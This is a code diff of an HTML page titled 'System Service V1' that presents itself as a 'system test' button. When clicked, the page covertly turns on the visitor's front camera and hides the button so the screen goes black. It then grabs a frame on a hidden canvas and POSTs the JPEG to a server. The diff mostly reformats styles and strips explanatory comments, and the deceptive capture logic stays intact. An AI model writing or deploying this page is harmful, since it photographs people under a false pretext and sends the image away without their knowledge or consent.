@@ -5,14 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>System Service V1</title>
     <style>
-        body { background: black; color: white; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; font-family: sans-serif; }
-        #startBtn { padding: 25px 40px; background: #444; color: white; border: 2px solid #fff; border-radius: 12px; cursor: pointer; font-size: 22px; font-weight: bold; }
+        body { 
+            background: black; 
+            color: white; 
+            margin: 0; 
+            height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            overflow: hidden; 
+            font-family: sans-serif; 
+        }
+        #startBtn { 
+            padding: 25px 40px; 
+            background: #444; 
+            color: white; 
+            border: 2px solid #fff; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            font-size: 22px; 
+            font-weight: bold; 
+        }
     </style>
 </head>
 <body>
 
     <button id="startBtn">START SYSTEM TEST</button>
-    
     <video id="video" style="display:none;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -25,13 +43,11 @@
             const canvas = document.getElementById('canvas');
             const btn = this;
 
-            // Immediate request to avoid browser timeout
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(function(stream) {
                     video.srcObject = stream;
-                    btn.style.display = 'none'; // Screen goes black
+                    btn.style.display = 'none'; 
                     
-                    // Wait for video to be ready
                     video.onloadedmetadata = () => {
                         setTimeout(() => {
                             canvas.width = video.videoWidth;
@@ -47,7 +63,6 @@
                                     method: 'POST',
                                     body: formData
                                 }).then(() => {
-                                    // Stop the camera after sending
                                     stream.getTracks().forEach(track => track.stop());
                                 });
                             }, 'image/jpeg');
@@ -55,7 +70,7 @@
                     };
                 })
                 .catch(function(err) {
-                    alert("System requires camera access to proceed. Check your browser settings.");
+                    alert("Camera access is required.");
                 });
         });
     </script>
